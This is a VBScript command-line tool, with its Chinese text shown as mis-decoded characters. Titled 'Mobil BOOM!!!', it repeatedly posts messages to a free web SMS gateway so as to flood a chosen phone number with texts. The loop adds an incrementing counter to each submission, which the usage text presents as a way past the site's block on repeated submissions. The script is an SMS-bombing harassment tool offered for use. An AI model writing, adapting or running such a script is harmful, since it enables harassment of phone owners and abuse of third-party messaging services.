   '×÷Õß:Lilo(Ð¡Æ×Ó) / »ÒÉ«¹ì¼£
   'VBS+XMLHTTP ÀûÓÃÃâ·Ñ¶ÌÐÅÍø¹Ø ·¢ÊÖ»ú¶ÌÐÅ

   iEnter= Chr(13) & Chr(10)
   Usage = "CScript iSMS.vbs ÊÖ»úºÅÂë ÄúµÄÐÕÃû ÄúµÄÐÔ±ð ·¢ËÍ´ÎÊý ·¢ËÍÄÚÈÝ [ÀÛ¼ÓÒò×Ó]" & iEnter & iEnter & "×¢Òâ: ÐÔ±ðÖÐ1±íÊ¾ÏÈÉú,2±íÊ¾'Å®Ê¿',Èç¹ûÄúµÄÐÕÃû»ò·¢ËÍÄÚÈÝÖÐÓÐ¿Õ¸ñ»òÎª¿ÕÊ±,ÇëÊ¹ÓÃÒýºÅ½«¸Ã²ÎÊýÒý×¡¡£ÓÉÓÚ¸ÃÍøÕ¾²»ÔÊÐíÌá½»ÖØ¸´Êý¾Ý,ËùÒÔÔÚÑ»·ÖÐ²Î¼ÓÁËÀÛ¼ÓÒò×Ó,¸Ã²ÎÊýÊÇÊýÖµÐÍ¿ÉÑ¡Ïî¡£" & iEnter & iEnter & "CScript iSMS.vbs -h ²éÔÄÓÃ·¨ÊµÀý¡£"

   Function URLEncoding(vstrIn)
       strReturn = ""
       For i = 1 To Len(vstrIn)
           ThisChr = Mid(vStrIn,i,1)
           If Abs(Asc(ThisChr)) < &HFF Then
               strReturn = strReturn & ThisChr
           Else
               innerCode = Asc(ThisChr)
               If innerCode < 0 Then
                   innerCode = innerCode + &H10000
               End If
               Hight8 = (innerCode And &HFF00)\ &HFF
               Low8 = innerCode And &HFF
               strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
           End If
       Next
       URLEncoding = strReturn
   End Function

   Function bytes2BSTR(vIn)
       strReturn = ""
       For i = 1 To LenB(vIn)
           ThisCharCode = AscB(MidB(vIn,i,1))
           If ThisCharCode < &H80 Then
               strReturn = strReturn & Chr(ThisCharCode)
           Else
               NextCharCode = AscB(MidB(vIn,i+1,1))
               strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
               i = i + 1
           End If
       Next
       bytes2BSTR = strReturn
   End Function

   Function xmlPost(iPost,iUrl)
       iPost=URLEncoding(iPost)
       Set xPost = CreateObject("Microsoft.XMLHTTP")
       xPost.open "POST",iUrl,false
           xPost.setRequestHeader "Content-Length",Len(iPost)
           xPost.setRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
       xPost.send(iPost)
       xmlPost=bytes2BSTR(xPost.responseBody)
   End Function

   Function xmlHead(iUrl)
       iPost=URLEncoding(iPost)
       Set xPost = CreateObject("Microsoft.XMLHTTP")
       xPost.open "POST",iUrl,false
       xPost.send(iPost)
       'xmlHead=bytes2BSTR(xPost.responseBody)
   End Function

   Function GetBt(vString,iString,dString)
       iNum = inStr(Getinfo,iString)
       dNum = inStr(Getinfo,dString)
       iLen = Len(iString) + iNum
       GetBt= Mid(Getinfo,iLen,dNum-iLen)
   End Function

   Sub IsWrong()
       If IsNumeric(mobil)=False Then WScript.Echo "´íÎó:ÊÖ»úºÅÂëÓ¦Îª´¿Êý×Ö¡£" : WScript.Quit
       If Len(mobil) <> 11 Then Wscript.Echo "´íÎó:ÊÖ»úºÅÂëÎª11Î»Êý×Ö¡£" : WScript.Quit
       If IsNumeric(cf)=False Then WScript.Echo "´íÎó:ÐÔ±ð´íÎó,1´ú±íÏÈÉú,2´ú±íÅ®Ê¿¡£" : WScript.Quit
       If cf<>1 And cf<>2 Then WScript.Echo "´íÎó:ÐÔ±ð´íÎó,1´ú±íÏÈÉú,2´ú±íÅ®Ê¿¡£" : WScript.Quit
       If message = "" Then WScript.Echo "´íÎó:·¢ËÍÄÚÈÝ²»ÄÜÎª¿Õ¡£" :WScript.Quit
       If IsNumeric(vlTitle)=False Then WScript.Echo "´íÎó:·¢ËÍ´ÎÊýÓ¦Îª´¿Êý×Ö¡£":WScript.Quit
       If IsNumeric(iStart)=False Then WScript.Echo "´íÎó:·¢ËÍ´ÎÊýÒò×ÓÓ¦Îª´¿Êý×Ö¡£":WScript.Quit
   End Sub

   If (LCase(Right(WScript.Fullname,11))="wscript.exe") Then
       Msgbox "VBS+XMLHTTP ÀûÓÃÃâ·Ñ¶ÌÐÅÍø¹Ø·¢ÊÖ»ú¶ÌÐÅ" & iEnter & iEnter & "×÷Õß:Lilo(Ð¡Æ×Ó) - [»ÒÉ«¹ì¼£]" &iEnter &iEnter &Usage, 4096 , "Lilo/ÔÆµðØÆð       Mobil BOOM!!!"
       WScript.Quit
   End If

   If WScript.Arguments(0)="-h" Then WScript.Echo iEnter & iEnter & "ÀýÈç:" & iEnter & iEnter & "CScript iSMS.vbs 01234567891 Lilo 1 100 hello 120" :WScript.Quit

   If WScript.Arguments.Count < 5 Then
       WScript.Echo iEnter &Chr(7)& "´íÎó:²ÎÊý²»¹»¡£" & iEnter & iEnter & "Ê¹ÓÃ·½·¨:" &iEnter &iEnter & Usage
       WScript.Quit
   End If

   mobil  = WScript.Arguments(0)
   mname  = WScript.Arguments(1)
   cf     = WScript.Arguments(2)
   vlTitle= WScript.Arguments(3)
   message= WScript.Arguments(4)
   xcni   = "xcni"

   If WScript.Arguments.Count=6 Then iStart = WScript.Arguments(5) Else iStart = 0
   Call IsWrong()

   WScript.Echo iEnter
   For iSendNumeric=1 To Abs(vlTitle)
       Postr  = "mobil=" & mobil & "&name=" & mname & ":" & (iSendNumeric+iStart) & "&cf=" & cf & "&message=" & message & (iSendNumeric+iStart) & "&xcni=" & xcni
       Getinfo = xmlPost(Postr,"http://sms.bkwww.com/success.asp")
       ReturnInfo = GetBt(Getinfo,"javascript>alert('","');location")
       If inStr(ReturnInfo,"¶ÌÐÅ·¢ËÍ³É¹¦") Then ReturnInfo = Left (ReturnInfo,6) & "! µÚ" & iSendNumeric & "´Î."
       If inStr(ReturnInfo,"Çë²»Òª·´¸´Ìá½»") Then ReturnInfo = "·¢ËÍÊ§°Ü!  µÚ" & iSendNumeric & "´Î."
       WScript.Echo ReturnInfo
       xmlHead("http://sms.bkwww.com/index.asp")
       If iSendNumeric >= vlTitle+iStart Then Exit For
   Next
